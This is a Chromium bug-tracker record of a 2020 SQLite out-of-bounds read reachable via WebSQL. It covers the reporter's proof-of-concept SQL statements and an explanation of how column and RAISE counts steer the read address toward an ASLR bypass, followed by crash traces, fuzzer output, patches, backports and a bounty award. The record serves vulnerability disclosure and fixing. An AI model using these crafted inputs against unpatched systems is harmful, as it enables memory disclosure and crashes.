# Out-of-bounds read in WebSQL

| Field | Value |
|-------|-------|
| **Issue ID** | [40051717](https://issues.chromium.org/issues/40051717) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Internals>Storage |
| **Platforms** | Android, Fuchsia, Linux, Mac, Windows, ChromeOS |
| **Reporter** | et...@gmail.com |
| **Assignee** | hu...@chromium.org |
| **Created** | 2020-03-09 |
| **Bounty** | $3,000.00 |

## Description

UserAgent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36

Steps to reproduce the problem:
When open the attached HTML with chrome and click the button, current tab will crash because read inaccessible address.

What is the expected behavior?

What went wrong?
Executing SQL command by WebSQL can lead oob read,and the read address is controllable.
This vulnerability occurred in sqlite3Parser
The pExpr parameter of exprNodeIsConstant (Walker * pWalker, Expr * pExpr) is a incorrect result and can be controlled by the attacker.
Specifically, you can increase the column field in SQL to control the upper four bytes.
For example, after column3, column4 continue to add to column3, column4, column5, column6, column7, column8, column9 ...... column N
In addition, you can control the lower four bytes by increasing the number of RAISE (ROLLBACK, 'Sakura').

Here is an example
CREATE TABLE table0 (column0 DEFAULT (over () NOT IN (RAISE (ROLLBACK, 'Sakura'), RAISE (ROLLBACK, 'Sakura'), RAISE (ROLLBACK, 'Sakura'))), column1, column2 DEFAULT (over () NOTNULL IN (RAISE (ROLLBACK, 'Sakura'), RAISE (ROLLBACK, 'Sakura'), RAISE (ROLLBACK, 'Sakura'))), column3); INSERT INTO table0 (column1) VALUES (1));

pExpr = 0x0000000e0000001e
--->
CREATE TABLE table0 (column0 DEFAULT (over () NOT IN (RAISE (ROLLBACK, 'Sakura'), RAISE (ROLLBACK, 'Sakura'), RAISE (ROLLBACK, 'Sakura'), RAISE (ROLLBACK, 'Sakura'), RAISE (ROLLBACK, 'Sakura'))), column1, column2 DEFAULT (over () NOTNULL IN (RAISE (ROLLBACK, 'Sakura'), RAISE (ROLLBACK, 'Sakura'), RAISE (ROLLBACK, 'Sakura'))), column3, column4, column5); INSERT INTO table0 (column1) VALUES (1));
pExpr = 0x0000001000000024

There are other ways to control the value of pExpr, but the above is the easiest way I found.
OOB read through a controllable address may cause exprNodeIsConstant to return incorrect results to change the program's execution flow, or it can be used by an attacker to guess the contents of the address and bypass aslr.

version:
Chrome Version: Version 80.0.3987.132(Official Build)(64-bit)
Operation System:OSX, Windows, Linux

Crash State:
0:013> g
(af4.2334): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
chrome!GetHandleVerifier+0x31c395:
00007ffb`30112725 f6470401        test    byte ptr [rdi+4],1 ds:00000013`0000037d=??

register
rax=0000000000000000 rbx=00000037477fe320 rcx=00000037477fe302
rdx=0000001300000379 rsi=00000037477fe320 rdi=0000001300000379
rip=00007ffb30112725 rsp=00000037477fe240 rbp=00000037477fe320
 r8=00000037477fe408  r9=0000000000000000 r10=0000000000000012
r11=000002042f28cbf0 r12=000002042bf429e0 r13=0000000000000000
r14=00000037477ff4a8 r15=000002042bf429b0
iopl=0         nv up ei pl zr na po nc
cs=0033  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010244
chrome!GetHandleVerifier+0x31c395:
00007ffb`30112725 f6470401        test    byte ptr [rdi+4],1 ds:00000013`0000037d=??

0:011> k
 # Child-SP          RetAddr           Call Site
00 00000037`477fe240 00007ffb`30112825 chrome!GetHandleVerifier+0x31c395
01 00000037`477fe280 00007ffb`30112843 chrome!GetHandleVerifier+0x31c495
02 00000037`477fe2c0 00007ffb`301105e1 chrome!GetHandleVerifier+0x31c4b3
03 00000037`477fe300 00007ffb`30111031 chrome!GetHandleVerifier+0x31a251
04 00000037`477fe380 00007ffb`3010efa2 chrome!GetHandleVerifier+0x31aca1
05 00000037`477fe460 00007ffb`3010e79d chrome!GetHandleVerifier+0x318c12
06 00000037`477fe590 00007ffb`30114821 chrome!GetHandleVerifier+0x31840d
07 00000037`477fe5d0 00007ffb`30109ac4 chrome!GetHandleVerifier+0x31e491
08 00000037`477fe650 00007ffb`300f9367 chrome!GetHandleVerifier+0x313734
09 00000037`477fe840 00007ffb`300d09f3 chrome!GetHandleVerifier+0x302fd7
0a 00000037`477fe9f0 00007ffb`300cfe2c chrome!GetHandleVerifier+0x2da663
0b 00000037`477ff440 00007ffb`2d275e64 chrome!GetHandleVerifier+0x2d9a9c
0c 00000037`477ff680 00007ffb`32e633dd chrome!ChromeMain+0x1e244c
0d 00000037`477ff6c0 00007ffb`3309d1ca chrome!RelaunchChromeBrowserWithNewCommandLineIfNeeded+0x253bcb2
0e 00000037`477ff740 00007ffb`32e6288e chrome!RelaunchChromeBrowserWithNewCommandLineIfNeeded+0x2775a9f
0f 00000037`477ff800 00007ffb`32e620cb chrome!RelaunchChromeBrowserWithNewCommandLineIfNeeded+0x253b163
10 00000037`477ff830 00007ffb`32e624f7 chrome!RelaunchChromeBrowserWithNewCommandLineIfNeeded+0x253a9a0
11 00000037`477ff870 00007ffb`32e615a6 chrome!RelaunchChromeBrowserWithNewCommandLineIfNeeded+0x253adcc
12 00000037`477ff8d0 00007ffb`2d0a80a1 chrome!RelaunchChromeBrowserWithNewCommandLineIfNeeded+0x2539e7b
13 00000037`477ff900 00007ffb`2d0a4d59 chrome!ChromeMain+0x14689
14 00000037`477ffa00 00007ffb`2d0a4ae1 chrome!ChromeMain+0x11341
15 00000037`477ffb40 00007ffb`2d0a4a1c chrome!ChromeMain+0x110c9
16 00000037`477ffbd0 00007ffb`2d0a4938 chrome!ChromeMain+0x11004
17 00000037`477ffc50 00007ffb`2d0a428e chrome!ChromeMain+0x10f20
18 00000037`477ffcb0 00007ffb`2f2c7a42 chrome!ChromeMain+0x10876
19 00000037`477ffd50 00007ffb`2f64031d chrome!CrashForExceptionInNonABICompliantCodeRange+0x5164b2
1a 00000037`477ffdf0 00007ffb`6f2f3034 chrome!CrashForExceptionInNonABICompliantCodeRange+0x88ed8d
1b 00000037`477ffe70 00007ffb`70231431 KERNEL32!BaseThreadInitThunk+0x14
1c 00000037`477ffea0 00000000`00000000 ntdll!RtlUserThreadStart+0x21

credit:
Nan Wang(@eternalsakura13) and Guang Gong of Alpha Lab, Qihoo 360

Did this work before? N/A 

Chrome version: 80.0.3987.132  Channel: stable
OS Version: OS X 10.15.3
Flash Version:

## Attachments

- [oob.html](attachments/oob.html) (text/plain, 2.2 KB)
- [oob1.html](attachments/oob1.html) (text/plain, 2.2 KB)

## Timeline

### et...@gmail.com (2020-03-09)

I wrote a program to call sqlite's sqlite3_exec to execute vulnerable SQL statement.
This is the stack trace. You can also reproduce it directly on the sqlite shell without any flags.
(lldb) disassemble -s $rip
main`exprNodeIsConstant:
->  0x10e201135 <+37>: mov    ecx, dword ptr [rax + 0x4]
    0x10e201138 <+40>: and    ecx, 0x1
    0x10e20113b <+43>: cmp    ecx, 0x0
    0x10e20113e <+46>: je     0x10e20115a               ; <+74> at sqlite3.c:100511:11
    0x10e201144 <+52>: mov    rax, qword ptr [rbp - 0x10]

(lldb) register read
General Purpose Registers:
       rax = 0x0000001000000024

(lldb) bt
* thread #1, queue = 'com.apple.main-thread', stop reason = EXC_BAD_ACCESS (code=1, address=0x1000000028)
  * frame #0: 0x000000010e201135 main`exprNodeIsConstant(pWalker=0x00007ffee1accd90, pExpr=0x0000001000000024) at sqlite3.c:100506:28
    frame #1: 0x000000010e201432 main`walkExpr(pWalker=0x00007ffee1accd90, pExpr=0x0000001000000024) at sqlite3.c:96474:10
    frame #2: 0x000000010e2014e1 main`walkExpr(pWalker=0x00007ffee1accd90, pExpr=0x00007fbd714028d0) at sqlite3.c:96478:27
    frame #3: 0x000000010e2013e8 main`sqlite3WalkExpr(pWalker=0x00007ffee1accd90, pExpr=0x00007fbd714028d0) at sqlite3.c:96502:18
    frame #4: 0x000000010e201100 main`exprIsConst(p=0x00007fbd714028d0, initFlag=2, iCur=0) at sqlite3.c:100580:3
    frame #5: 0x000000010e1fc0bc main`sqlite3ExprIsConstantNotJoin(p=0x00007fbd714028d0) at sqlite3.c:100610:10
    frame #6: 0x000000010e1fbf0e main`sqlite3ExprCodeTemp(pParse=0x00007ffee1ace558, pExpr=0x00007fbd714028d0, pReg=0x00007ffee1accf68) at sqlite3.c:103064:7
    frame #7: 0x000000010e1febcb main`exprCodeVector(pParse=0x00007ffee1ace558, p=0x00007fbd714028d0, piFreeable=0x00007ffee1accf68) at sqlite3.c:102137:15
    frame #8: 0x000000010e1fddf0 main`sqlite3ExprCodeIN(pParse=0x00007ffee1ace558, pExpr=0x00007fbd714028a0, destIfFalse=-4, destIfNull=-5) at sqlite3.c:101734:14
    frame #9: 0x000000010e1f9fc0 main`sqlite3ExprCodeTarget(pParse=0x00007ffee1ace558, pExpr=0x00007fbd714028a0, target=4) at sqlite3.c:102776:7
    frame #10: 0x000000010e1f73df main`sqlite3ExprCode(pParse=0x00007ffee1ace558, pExpr=0x00007fbd71402800, target=4) at sqlite3.c:103090:11
    frame #11: 0x000000010e20781e main`sqlite3ExprCodeFactorable(pParse=0x00007ffee1ace558, pExpr=0x00007fbd71402800, target=4) at sqlite3.c:103125:5
    frame #12: 0x000000010e1eaf95 main`sqlite3Insert(pParse=0x00007ffee1ace558, pTabList=0x000000010e2fbf50, pSelect=0x0000000000000000, pColumn=0x000000010e2facd0, onError=11, pUpsert=0x0000000000000000) at sqlite3.c:120045:9
    frame #13: 0x000000010e1d8063 main`yy_reduce(yypParser=0x00007ffee1acdb30, yyruleno=156, yyLookahead=23, yyLookaheadToken=(z = ");", n = 1), pParse=0x00007ffee1ace558) at sqlite3.c:156070:3
    frame #14: 0x000000010e1d5856 main`sqlite3Parser(yyp=0x00007ffee1acdb30, yymajor=23, yyminor=(z = ");", n = 1)) at sqlite3.c:157007:15
    frame #15: 0x000000010e14d061 main`sqlite3RunParser(pParse=0x00007ffee1ace558, zSql=");", pzErrMsg=0x00007ffee1ace700) at sqlite3.c:158286:5
    frame #16: 0x000000010e1c9b88 main`sqlite3Prepare(db=0x00007fbd71401460, zSql="INSERT INTO table0 (column1 ) VALUES (1));", nBytes=-1, prepFlags=128, pReprepare=0x0000000000000000, ppStmt=0x00007ffee1ace828, pzTail=0x00007ffee1ace830) at sqlite3.c:127329:5
    frame #17: 0x000000010e14b790 main`sqlite3LockAndPrepare(db=0x00007fbd71401460, zSql="INSERT INTO table0 (column1 ) VALUES (1));", nBytes=-1, prepFlags=128, pOld=0x0000000000000000, ppStmt=0x00007ffee1ace828, pzTail=0x00007ffee1ace830) at sqlite3.c:127401:10
    frame #18: 0x000000010e14a9d6 main`sqlite3_prepare_v2(db=0x00007fbd71401460, zSql="INSERT INTO table0 (column1 ) VALUES (1));", nBytes=-1, ppStmt=0x00007ffee1ace828, pzTail=0x00007ffee1ace830) at sqlite3.c:127485:8
    frame #19: 0x000000010e14a4b7 main`sqlite3_exec(db=0x00007fbd71401460, zSql="INSERT INTO table0 (column1 ) VALUES (1));", xCallback=(main`ExecHandler at main.c:42), pArg=0x00007ffee1ace8b4, pzErrMsg=0x00007ffee1ace888) at sqlite3.c:121887:10
    frame #20: 0x000000010e13246a main`RunSqlQuery(query="CREATE TABLE table0 (column0 DEFAULT (over()  NOT  IN (RAISE(ROLLBACK, 'Sakura'),RAISE(ROLLBACK, 'Sakura'),RAISE(ROLLBACK, 'Sakura'),RAISE(ROLLBACK, 'Sakura'),RAISE(ROLLBACK, 'Sakura') ) ),column1 ,column2 DEFAULT (over()   NOTNULL  IN (RAISE(ROLLBACK, 'Sakura')    , RAISE(ROLLBACK, 'Sakura')  , RAISE(ROLLBACK, 'Sakura')  ) ), column3,column4,column5);INSERT INTO table0 (column1 ) VALUES (1));", exec_count=0x00007ffee1ace8b4) at main.c:49:5
    frame #21: 0x000000010e132333 main`main(argc=1, argv=0x00007ffee1ace8f0) at main.c:15:5
    frame #22: 0x00007fff6c6dc7fd libdyld.dylib`start + 1


### et...@gmail.com (2020-03-10)

[Empty comment from Monorail migration]

### cl...@chromium.org (2020-03-10)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://clusterfuzz.com/testcase?key=5632728539136000.

### mp...@chromium.org (2020-03-10)

I was able to reproduce this. Dr. Hipp and Daniel, could you take a look at the poc?

### cl...@chromium.org (2020-03-10)

Automatically applying components based on crash stacktrace and information from OWNERS files.

If this is incorrect, please apply the Test-Predator-Wrong-Components label.

[Monorail components: Internals>Storage]

### cl...@chromium.org (2020-03-10)

ClusterFuzz testcase 5632728539136000 appears to be flaky, updating reproducibility label.

### cl...@chromium.org (2020-03-10)

Detailed Report: https://clusterfuzz.com/testcase?key=5632728539136000

Fuzzer: 
Job Type: linux_asan_chrome_mp
Platform Id: linux

Crash Type: UNKNOWN READ
Crash Address: 0x0002bfff8003
Crash State:
  exprNodeIsConstant
  walkExpr
  walkExpr
  
Sanitizer: address (ASAN)

Recommended Security Severity: Medium

Crash Revision: https://clusterfuzz.com/revisions?job=linux_asan_chrome_mp&revision=748415

Reproducer Testcase: https://clusterfuzz.com/download?testcase_id=5632728539136000

The reproduce tool requires a ClusterFuzz source checkout. To prepare one, run:

git clone https://github.com/google/clusterfuzz && cd clusterfuzz && git checkout tags/reproduce-tool-stable

To reproduce this issue, run:

./reproduce.sh -t https://clusterfuzz.com/testcase-detail/5632728539136000 -b /path/to/build

Please use the GN arguments provided in this report when building the binary. If you have any feedback on reproducing test cases, let us know at https://forms.gle/Yh3qCYFveHj6E5jz5 so we can improve.


************************* UNREPRODUCIBLE *************************
Note: This crash might not be reproducible with the provided testcase. That said, for the past 14 days, we've been seeing this crash frequently.

It may be possible to reproduce by trying the following options:
- Run testcase multiple times for a longer duration.
- Run fuzzing without testcase argument to hit the same crash signature.

If it still does not reproduce, try a speculative fix based on the crash stacktrace and verify if it works by looking at the crash statistics in the report. We will auto-close the bug if the crash is not seen for 14 days.
******************************************************************

The recommended severity (Security_Severity-Medium) is different from what was assigned to the bug. Please double check the accuracy of the assigned severity.

### dr...@gmail.com (2020-03-10)

Initial bug fix here: https://www.sqlite.org/src/info/a2d6f108c5d07559

This fix should be sufficient for now.  But more changes may land as we do deeper analysis of the problem looking for similar cases.

### et...@gmail.com (2020-03-10)

I think because I can partially control the address of the oob read, this vulnerability should be high.
Can i help you with your repair？

### [Deleted User] (2020-03-10)

Setting milestone and target because of Security_Impact=Stable and high severity.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2020-03-10)

Setting Pri-1 to match security severity High. If this is incorrect, please reset the priority. Sheriffbot won't make this change again.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### dr...@gmail.com (2020-03-10)

Two additional changes have been applied to the SQLite trunk to help prevent similar problems in other areas.  We have no test cases for these extra changes - the additional changes are proactive.  All three patches are collected into a single patch on the 3.31 branch, for your convenience, in case you would like to backport:  https://sqlite.org/src/info/2b750b0f74e5a116

FWIW:  There is another patch on trunk (https://sqlite.org/src/info/5f60b527b938c077) that adds new error checking and analysis logic to debug builds that should detect any similar problems in the future.  That error checking and analysis logic will be in the next release, but it not included in the patch linked in the first paragraph of this note.


### hu...@chromium.org (2020-03-12)

Thank you, Dr. Hipp! Thanks as well for putting the 3 patches into one on 3.31 for ease of backporting :)

I'll backport the fix at https://sqlite.org/src/info/2b750b0f74e5a116 , but will wait for the next release to get the additional checks at https://sqlite.org/src/info/5f60b527b938c077.

### et...@gmail.com (2020-03-12)

I reviewed the patch, maybe this vulnerability represents a type of vulnerability pattern, can i get a cve and bounty for this issue? thanks :)

### hu...@chromium.org (2020-03-12)

Yes, of course. +adetaylor@, who knows more about how this process works.

### ad...@google.com (2020-03-12)

Hi, thanks for the report! This will get a CVE when it's mentioned in the Chrome release notes. It will also go to the VRP panel but I can't say how they will decide.

huangdarwin@, once this is fixed in trunk, as ever, please mark as Fixed so that Sheriffbot starts the process of requesting merges to M81.

### bu...@chops-service-accounts.iam.gserviceaccount.com (2020-03-12)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/f3e4b2b91b217f0f1a4237893c67ec185f891f58

commit f3e4b2b91b217f0f1a4237893c67ec185f891f58
Author: Darwin Huang <huangdarwin@chromium.org>
Date: Thu Mar 12 19:50:38 2020

sqlite: Backport bugfix.

Bug: 1059669
Change-Id: I741137daec09eed6870a227c8551940776478d9a
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/2100009
Reviewed-by: Chris Mumford <cmumford@google.com>
Commit-Queue: Darwin Huang <huangdarwin@chromium.org>
Cr-Commit-Position: refs/heads/master@{#749833}

[modify] https://crrev.com/f3e4b2b91b217f0f1a4237893c67ec185f891f58/third_party/sqlite/amalgamation/sqlite3.c
[modify] https://crrev.com/f3e4b2b91b217f0f1a4237893c67ec185f891f58/third_party/sqlite/patched/src/expr.c
[modify] https://crrev.com/f3e4b2b91b217f0f1a4237893c67ec185f891f58/third_party/sqlite/patched/src/insert.c
[modify] https://crrev.com/f3e4b2b91b217f0f1a4237893c67ec185f891f58/third_party/sqlite/patched/test/default.test
[modify] https://crrev.com/f3e4b2b91b217f0f1a4237893c67ec185f891f58/third_party/sqlite/patches/0001-Remove-unreachable-NEVER.patch
[modify] https://crrev.com/f3e4b2b91b217f0f1a4237893c67ec185f891f58/third_party/sqlite/patches/0002-Fix-fts3-problems-found-by-asan.patch
[modify] https://crrev.com/f3e4b2b91b217f0f1a4237893c67ec185f891f58/third_party/sqlite/patches/0003-Ensure-Expr.y.pTab-pointer-is-not-null-before-use.patch
[modify] https://crrev.com/f3e4b2b91b217f0f1a4237893c67ec185f891f58/third_party/sqlite/patches/0004-faster-solution-to-prevous-patch.patch
[modify] https://crrev.com/f3e4b2b91b217f0f1a4237893c67ec185f891f58/third_party/sqlite/patches/0005-Remove-NEVER-macro.patch
[add] https://crrev.com/f3e4b2b91b217f0f1a4237893c67ec185f891f58/third_party/sqlite/patches/0006-Prevent-read-only-expressions-held-in-the-schema-fro.patch


### hu...@chromium.org (2020-03-12)

Thanks for the quick response, adetaylor@! I recall there's some Label we should add for vuln rewards. Do you know how that label is formatted?

### hu...@chromium.org (2020-03-12)

[Empty comment from Monorail migration]

### [Deleted User] (2020-03-12)

This bug requires manual review: We are only 4 days from stable.
Before a merge request will be considered, the following information is required to be added to this bug:

1. Does your merge fit within the Merge Decision Guidelines?
- Chrome: https://chromium.googlesource.com/chromium/src.git/+/master/docs/process/merge_request.md#when-to-request-a-merge
- Chrome OS: https://goto.google.com/cros-release-branch-merge-guidelines
2. Links to the CLs you are requesting to merge.
3. Has the change landed and been verified on master/ToT?
4. Why are these changes required in this milestone after branch?
5. Is this a new feature?
6. If it is a new feature, is it behind a flag using finch?

Please contact the milestone owner if you have questions.
Owners: benmason@(Android), bindusuvarna@(iOS), geohsu@(ChromeOS), pbommana@(Desktop)

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### hu...@chromium.org (2020-03-12)

1. Yes
2. https://crrev.com/c/2101694
3. Not yet, but it will have by tomorrow morning, after canary is released.
4. Security_Severity-High, Security_Impact-Stable
5. No.
6. N/A

### ad...@chromium.org (2020-03-12)

huangdarwin@ Are you confident of the stability of this fix (we only want to merge stuff through to stable if something is obviously simple and correct, does this fit the bill?)

Re https://crbug.com/chromium/1059669#c18 - that'll happen automatically. Thanks though.

### hu...@chromium.org (2020-03-12)

I'm fairly confident, but would prefer to wait for the first CL to bake into canary / our fuzzing infra for a bit before merging it. Note that the diff for this change is actually only +11 and -5 lines, as the only executable diff is in sqlite.c[1]. I've noticed we're only 4 days from stable, so ideally we'd merge this tomorrow, Friday 2020-03-13, or Monday 2020-03-16.

[1]: https://crrev.com/c/2101694/1/third_party/sqlite/amalgamation/sqlite3.c

### ad...@google.com (2020-03-13)

The candidate for the first M81 stable has already been cut, so this will likely make it into the first stable refresh of M81. I'll likely approve the merge on or around Tuesday unless you see any contra-indications.

### [Deleted User] (2020-03-13)

[Empty comment from Monorail migration]

### hu...@chromium.org (2020-03-13)

Sounds good to me. Thanks!

### bu...@chops-service-accounts.iam.gserviceaccount.com (2020-03-14)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/deps/sqlite/+/3d3ac5e6f58a5bc28e96e621909b594e7f950e53

commit 3d3ac5e6f58a5bc28e96e621909b594e7f950e53
Author: Chris Mumford <cmumford@chromium.org>
Date: Thu Mar 12 21:26:32 2020

Prevent the read-only expressions held in the schema from being passed down into code generating subroutines where they might be changed.  Pass a copy of the expression instead.

FossilOrigin-Name: 2b750b0f74e5a11621997267d419c567cd860dd8bc7306d58fe037200c0d7679
(cherry picked from commit efd6135b219a86795d5d67d53dc2fad8e447653e)

https://sqlite.org/src/info/2b750b0f74e5a116

Bug: 1059669
Change-Id: If9fb6ed2d1bb5d999e686d8e3d8460eab6f6b383
[add] https://crrev.com/3d3ac5e6f58a5bc28e96e621909b594e7f950e53/amalgamation_dev/rename_exports.h
[add] https://crrev.com/3d3ac5e6f58a5bc28e96e621909b594e7f950e53/amalgamation_dev/sqlite3.c
[modify] https://crrev.com/3d3ac5e6f58a5bc28e96e621909b594e7f950e53/test/default.test
[modify] https://crrev.com/3d3ac5e6f58a5bc28e96e621909b594e7f950e53/src/insert.c
[add] https://crrev.com/3d3ac5e6f58a5bc28e96e621909b594e7f950e53/amalgamation_dev/README.md
[add] https://crrev.com/3d3ac5e6f58a5bc28e96e621909b594e7f950e53/amalgamation_dev/sqlite3.h
[modify] https://crrev.com/3d3ac5e6f58a5bc28e96e621909b594e7f950e53/amalgamation/sqlite3.c
[modify] https://crrev.com/3d3ac5e6f58a5bc28e96e621909b594e7f950e53/src/expr.c
[modify] https://crrev.com/3d3ac5e6f58a5bc28e96e621909b594e7f950e53/manifest
[modify] https://crrev.com/3d3ac5e6f58a5bc28e96e621909b594e7f950e53/amalgamation/sqlite3.h
[add] https://crrev.com/3d3ac5e6f58a5bc28e96e621909b594e7f950e53/amalgamation_dev/shell/shell.c


### na...@google.com (2020-03-16)

[Empty comment from Monorail migration]

### ad...@google.com (2020-03-18)

I don't think this quite made it into M82 so adding a merge request there as well.

### ad...@google.com (2020-03-18)

Approving merge for M81, branch 4044, and M82 branch 4085; please merge. Adding a merge request for M80 to be considered in a few days.

### na...@google.com (2020-03-19)

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.
******************************

### na...@google.com (2020-03-19)

Congrats! The Panel decided to award $3,000 for this report!

### et...@gmail.com (2020-03-19)

Very generous reward, thank you very much!

### hu...@google.com (2020-03-19)

+pwnall for heads up (no action needed)

### hu...@chromium.org (2020-03-19)

Thank you for the M81 and M82 merge approvals, adetaylor@. Just wanted to confirm that I've seen the Merge-Approved. I'm trying to merge them in, and am waiting for branches to go green.

By the way, I noticed that M80 is using an older version of sqlite with a significant amount of (25!) patches. Therefore, cherry-picking this change introduces a larger and different cherry-pick with some merge conflicts. Therefore, I wouldn't have as much confidence in the safety of such a patch, and would normally advise against merging back to M80.

That said, there are some unique circumstances here... In support of merging this back, this is a Security_Severity-high, so this bug is more important than most for users' security. Also, branches are frozen, so we can't get M81 out into stable soon. In support of not merging this back, this will need to be a change not validated on other Chromium versions, which would carry quite some risk, and I assume merging-back reverts would be even more expensive than usual now... WDYT? I'd personally still advise against trying a merge-back, but am unsure given our unique circumstances.

### cm...@chromium.org (2020-03-19)

Darwin: Another option for M80 is to merge https://crrev.com/c/2013741 into M80 and use the new SQLite repo.

### ad...@chromium.org (2020-03-20)

Thanks. Let's not merge to M80 then. We are extremely reluctant to merge complex changes back to the current stable branch at any time, and especially right now when our QA may be even more limited.

### hu...@chromium.org (2020-03-20)

Thanks. Yes, I talked with pwnall@ too, and he also advised switching to use the complete new sqlite branch. This should be safe, because this is our most well-tested and up-to-date branch. 

The change may certainly look risky, as it will change a large set of files, but I agree that it is likely the best/safest solution. I'll prepare the change.

### pw...@chromium.org (2020-03-20)

Darwin and I chatted a bit about this situation.

I'd advise looking at //third_party/sqlite as one atomic unit, for the purpose of merging.

For example, I'd take the exact contents of //third_party/sqlite from M81 and land it into M80, instead of merging patches piecemeal. This exact code has baked for a long time, and I've never seen SQLite bugs get discovered this late in the cycle. In my opinion, this merge would be the safer option.

After having done this, I'd reason about taking patches from M82 to M81 similarly. The tradeoff balance is a bit different, because the SQLite bits in M82 haven't baked for as long. If the general strategy seems alright, we can reason about this next step.

### hu...@chromium.org (2020-03-20)

We'll no longer be backporting to M80.

I just talked with adetaylor@ offline (sorry for so many offthread conversations) and we've agreed the risk of M80 stability likely isn't worth it, despite the high security severity of the bug. Thank you for the suggestions though, cmumford@ and pwnall@ :)

### bu...@chops-service-accounts.iam.gserviceaccount.com (2020-03-20)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/e43d2df45ce9a6ad1e69f7d5b0437c76ace25847

commit e43d2df45ce9a6ad1e69f7d5b0437c76ace25847
Author: Darwin Huang <huangdarwin@chromium.org>
Date: Fri Mar 20 10:34:07 2020

sqlite: Backport bugfix (M82).

(cherry picked from commit f3e4b2b91b217f0f1a4237893c67ec185f891f58)

Bug: 1059669
Change-Id: I741137daec09eed6870a227c8551940776478d9a
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/2100009
Reviewed-by: Chris Mumford <cmumford@google.com>
Commit-Queue: Darwin Huang <huangdarwin@chromium.org>
Cr-Original-Commit-Position: refs/heads/master@{#749833}
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/2110914
Cr-Commit-Position: refs/branch-heads/4085@{#160}
Cr-Branched-From: 938fda43077d4622c5b88984608d6becd5ebbb82-refs/heads/master@{#749737}

[modify] https://crrev.com/e43d2df45ce9a6ad1e69f7d5b0437c76ace25847/third_party/sqlite/amalgamation/sqlite3.c
[modify] https://crrev.com/e43d2df45ce9a6ad1e69f7d5b0437c76ace25847/third_party/sqlite/patched/src/expr.c
[modify] https://crrev.com/e43d2df45ce9a6ad1e69f7d5b0437c76ace25847/third_party/sqlite/patched/src/insert.c
[modify] https://crrev.com/e43d2df45ce9a6ad1e69f7d5b0437c76ace25847/third_party/sqlite/patched/test/default.test
[modify] https://crrev.com/e43d2df45ce9a6ad1e69f7d5b0437c76ace25847/third_party/sqlite/patches/0001-Remove-unreachable-NEVER.patch
[modify] https://crrev.com/e43d2df45ce9a6ad1e69f7d5b0437c76ace25847/third_party/sqlite/patches/0002-Fix-fts3-problems-found-by-asan.patch
[modify] https://crrev.com/e43d2df45ce9a6ad1e69f7d5b0437c76ace25847/third_party/sqlite/patches/0003-Ensure-Expr.y.pTab-pointer-is-not-null-before-use.patch
[modify] https://crrev.com/e43d2df45ce9a6ad1e69f7d5b0437c76ace25847/third_party/sqlite/patches/0004-faster-solution-to-prevous-patch.patch
[modify] https://crrev.com/e43d2df45ce9a6ad1e69f7d5b0437c76ace25847/third_party/sqlite/patches/0005-Remove-NEVER-macro.patch
[add] https://crrev.com/e43d2df45ce9a6ad1e69f7d5b0437c76ace25847/third_party/sqlite/patches/0006-Prevent-read-only-expressions-held-in-the-schema-fro.patch


### bu...@chops-service-accounts.iam.gserviceaccount.com (2020-03-20)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/81ed1e14af3c35fd861b581937a2c8c9955a754d

commit 81ed1e14af3c35fd861b581937a2c8c9955a754d
Author: Darwin Huang <huangdarwin@chromium.org>
Date: Fri Mar 20 23:39:11 2020

sqlite: Backport bugfix. (M81)

Bug: 1059669
Change-Id: I08c5f9c2f4ea6f826608109c51e9cd4bd6ac1945
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/2101694
Reviewed-by: Chris Mumford <cmumford@google.com>
Commit-Queue: Darwin Huang <huangdarwin@chromium.org>
Cr-Commit-Position: refs/branch-heads/4044@{#820}
Cr-Branched-From: a6d9daf149a473ceea37f629c41d4527bf2055bd-refs/heads/master@{#737173}

[modify] https://crrev.com/81ed1e14af3c35fd861b581937a2c8c9955a754d/third_party/sqlite/amalgamation/sqlite3.c
[modify] https://crrev.com/81ed1e14af3c35fd861b581937a2c8c9955a754d/third_party/sqlite/patched/src/expr.c
[modify] https://crrev.com/81ed1e14af3c35fd861b581937a2c8c9955a754d/third_party/sqlite/patched/src/insert.c
[modify] https://crrev.com/81ed1e14af3c35fd861b581937a2c8c9955a754d/third_party/sqlite/patched/test/default.test
[add] https://crrev.com/81ed1e14af3c35fd861b581937a2c8c9955a754d/third_party/sqlite/patches/0006-Prevent-read-only-expressions-held-in-the-schema-fro.patch


### mm...@chromium.org (2020-03-25)

huangdarwin@, thank you for fixing this issue. Chrome Security team needs your knowledge to prevent that whole class of bugs from happening elsewhere. We would greatly appreciate if you could tell us more about the issue by filling out the following form: https://forms.gle/VWKDUv9a8GXCCRWm7

### mm...@chromium.org (2020-03-26)

[Empty comment from Monorail migration]

### na...@google.com (2020-03-26)

[Empty comment from Monorail migration]

### ad...@google.com (2020-04-04)

[Empty comment from Monorail migration]

### ad...@chromium.org (2020-04-04)

[Empty comment from Monorail migration]

### ad...@google.com (2020-04-07)

[Empty comment from Monorail migration]

### ad...@chromium.org (2020-04-14)

[Empty comment from Monorail migration]

### [Deleted User] (2020-06-20)

